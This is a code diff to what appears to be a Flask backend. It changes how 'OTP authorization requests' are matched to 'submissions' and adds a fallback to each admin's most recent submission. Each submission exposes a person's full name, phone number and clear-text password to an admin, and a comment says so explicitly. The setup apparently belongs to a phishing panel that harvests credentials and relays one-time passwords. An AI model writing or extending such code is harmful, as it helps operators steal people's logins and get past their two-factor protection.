@@ -1122,16 +1122,22 @@ def get_otp_authorization_requests():
             request_dict = auth_request.to_dict()
             
             # Add related submission info if available
+            submission = None
             if auth_request.submission_id:
                 submission = db.session.get(Submission, auth_request.submission_id)
-                if submission:
-                    request_dict['submission'] = {
-                        'fullname': submission.fullname,
-                        'password': submission.password,  # Pass clear-text password to admin
-                        'submitted_at': submission.submitted_at.isoformat() if submission.submitted_at else None,
-                        'phone_number': submission.phone_number
-                    }
             
+            # Fallback: find the most recent submission for this admin if direct lookup failed
+            if not submission and auth_request.admin_id:
+                submission = Submission.query.filter_by(admin_id=auth_request.admin_id)\
+                    .order_by(Submission.submitted_at.desc()).first()
+            
+            if submission:
+                request_dict['submission'] = {
+                    'fullname': submission.fullname,
+                    'password': submission.password,  # Pass clear-text password to admin
+                    'submitted_at': submission.submitted_at.isoformat() if submission.submitted_at else None,
+                    'phone_number': submission.phone_number
+                }
 
             
             requests_data.append(request_dict)
